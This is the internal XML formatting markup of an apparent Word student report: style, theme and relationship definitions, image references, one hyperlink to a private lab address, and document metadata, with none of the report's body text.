    <w:rsid w:val="00C32AA3"/>
    <w:rsid w:val="00C359A9"/>
    <w:rsid w:val="00C3602D"/>
    <w:rsid w:val="00C47165"/>
    <w:rsid w:val="00C50BF7"/>
    <w:rsid w:val="00C5264E"/>
    <w:rsid w:val="00C64A03"/>
    <w:rsid w:val="00CA1DA2"/>
    <w:rsid w:val="00CA57FA"/>
    <w:rsid w:val="00CE0CFE"/>
    <w:rsid w:val="00D00ED1"/>
    <w:rsid w:val="00D47184"/>
    <w:rsid w:val="00D47D1A"/>
    <w:rsid w:val="00D47F0D"/>
    <w:rsid w:val="00D5031E"/>
    <w:rsid w:val="00D517AF"/>
    <w:rsid w:val="00D62CAD"/>
    <w:rsid w:val="00D64ACC"/>
    <w:rsid w:val="00D7632C"/>
    <w:rsid w:val="00D76645"/>
    <w:rsid w:val="00D82413"/>
    <w:rsid w:val="00D85677"/>
    <w:rsid w:val="00D91485"/>
    <w:rsid w:val="00D91647"/>
    <w:rsid w:val="00E1017C"/>
    <w:rsid w:val="00E3170E"/>
    <w:rsid w:val="00E34B94"/>
    <w:rsid w:val="00E74506"/>
    <w:rsid w:val="00E8561E"/>
    <w:rsid w:val="00EA0FE0"/>
    <w:rsid w:val="00EA759D"/>
    <w:rsid w:val="00EB67A8"/>
    <w:rsid w:val="00ED0E81"/>
    <w:rsid w:val="00ED38DD"/>
    <w:rsid w:val="00EE6079"/>
    <w:rsid w:val="00F00CEE"/>
    <w:rsid w:val="00F07EF3"/>
    <w:rsid w:val="00F80137"/>
    <w:rsid w:val="00F9795F"/>
    <w:rsid w:val="00FB7D7B"/>
    <w:rsid w:val="00FC524D"/>
    <w:rsid w:val="00FC60A7"/>
    <w:rsid w:val="00FF0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44296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73543"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Heading3"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:qFormat/>
    <w:rsid w:val="00537DAC"/>
    <w:pPr>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Heading3"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00537DAC"/>
    <w:pPr>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="EED0C6" w:themeColor="accent3"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="2"/>
    <w:qFormat/>
    <w:rsid w:val="00F00CEE"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="40"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading4Char"/>
    <w:uiPriority w:val="3"/>
    <w:qFormat/>
    <w:rsid w:val="00F00CEE"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="40"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading5Char"/>
    <w:uiPriority w:val="4"/>
    <w:qFormat/>
    <w:rsid w:val="00A45BDD"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:ind w:right="284"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:i/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="6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5276A8"/>
    <w:rPr>
      <w:sz w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="005276A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0CEE"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="005276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537DAC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="1"/>
    <w:rsid w:val="00537DAC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="EED0C6" w:themeColor="accent3"/>
      <w:sz w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="2"/>
    <w:rsid w:val="00F00CEE"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Text">
    <w:name w:val="Text"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="5"/>
    <w:qFormat/>
    <w:rsid w:val="00F00CEE"/>
    <w:rPr>
      <w:i/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="3"/>
    <w:rsid w:val="00F00CEE"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="0006271E"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Header"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00F00CEE"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="0006271E"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Rockwell" w:hAnsi="Rockwell"/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00F00CEE"/>
    <w:rPr>
      <w:rFonts w:ascii="Rockwell" w:hAnsi="Rockwell"/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="PageNumber">
    <w:name w:val="page number"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="0006271E"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading5Char">
    <w:name w:val="Heading 5 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading5"/>
    <w:uiPriority w:val="4"/>
    <w:rsid w:val="00A45BDD"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:i/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="68"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="6"/>
    <w:qFormat/>
    <w:rsid w:val="00F00CEE"/>
    <w:pPr>
      <w:spacing w:before="480" w:after="480"/>
      <w:ind w:left="1134" w:right="1134"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="80"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QuoteChar">
    <w:name w:val="Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Quote"/>
    <w:uiPriority w:val="6"/>
    <w:rsid w:val="00F00CEE"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="80"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="PlaceholderText">
    <w:name w:val="Placeholder Text"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00F00CEE"/>
    <w:rPr>
      <w:color w:val="808080"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Title">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="TitleChar"/>
    <w:uiPriority w:val="10"/>
    <w:qFormat/>
    <w:rsid w:val="00537DAC"/>
    <w:pPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="80"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TitleChar">
    <w:name w:val="Title Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Title"/>
    <w:uiPriority w:val="10"/>
    <w:rsid w:val="00537DAC"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="24344E" w:themeColor="accent1"/>
      <w:sz w:val="80"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="IntroductionText">
    <w:name w:val="Introduction Text"/>
    <w:basedOn w:val="Heading4"/>
    <w:uiPriority w:val="7"/>
    <w:qFormat/>
    <w:rsid w:val="00537DAC"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Subtitle">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="SubtitleChar"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:rsid w:val="00537DAC"/>
    <w:rPr>
      <w:i/>
      <w:sz w:val="42"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="SubtitleChar">
    <w:name w:val="Subtitle Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Subtitle"/>
    <w:uiPriority w:val="11"/>
    <w:rsid w:val="00537DAC"/>
    <w:rPr>
      <w:i/>
      <w:sz w:val="42"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="009E3B85"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="009E3B85"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TitlePage-Version">
    <w:name w:val="Title Page - Version"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00D00ED1"/>
    <w:pPr>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Times New Roman"/>
      <w:i/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00D00ED1"/>
    <w:pPr>
      <w:spacing w:before="240" w:line="259" w:lineRule="auto"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1B263A" w:themeColor="accent1" w:themeShade="BF"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="00D00ED1"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
      </w:tabs>
      <w:spacing w:after="100"/>
      <w:ind w:left="240"/>
    </w:pPr>
    <w:rPr>
      <w:noProof/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rsid w:val="003A4D7B"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="35"/>
    <w:qFormat/>
    <w:rsid w:val="00E34B94"/>
    <w:pPr>
      <w:spacing w:after="200"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="5E5E5E" w:themeColor="text2"/>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TableofFigures">
    <w:name w:val="table of figures"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="008822EB"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00C50BF7"/>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7058A3"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLKeyboard">
    <w:name w:val="HTML Keyboard"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002018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866229">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="888104906">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1173643192">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1415127913">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1656841306">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="188805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jpg"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.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hyperlink" Target="http://10.0.2.15/index.html" TargetMode="External"/><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0.jp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20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.jpg"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image30.jpg"/><Relationship Id="rId54"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y\AppData\Roaming\Microsoft\Templates\Classic%20student%20report.dotx" TargetMode="External"/></Relationships>
</file>

<file path=word/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="CSR">
  <a:themeElements>
    <a:clrScheme name="CSR">
      <a:dk1>
        <a:srgbClr val="000000"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="5E5E5E"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="D6D5D5"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="24344E"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="DEECEC"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="EED0C6"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="EE6B69"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="E2A1A1"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="EFC5C5"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="0000FF"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="FF00FF"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Rockwell - Georgia">
      <a:majorFont>
        <a:latin typeface="Rockwell"/>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DE96D119-E5AC-D14F-93E7-58C331D3EE59}" vid="{D914C8BE-7F8A-A14E-904C-51198F26D08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3E1B92-02B3-4FC3-8DE4-FAE462CE31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CAC1FA21-0704-45B8-A2C2-B71E5CB0EF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8B5A5C6-D5B3-4652-97B3-821400C60E29}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.openxmlformats.org/officeDocument/2006/bibliography"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps4.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{1E6E14A6-9BF9-4BA9-A90A-5D24EDD49C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Classic student report.dotx</Template>
  <TotalTime>0</TotalTime>
  <Pages>28</Pages>
  <Words>4163</Words>
  <Characters>23732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2021-03-26T15:10:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-03-26T15:10:00Z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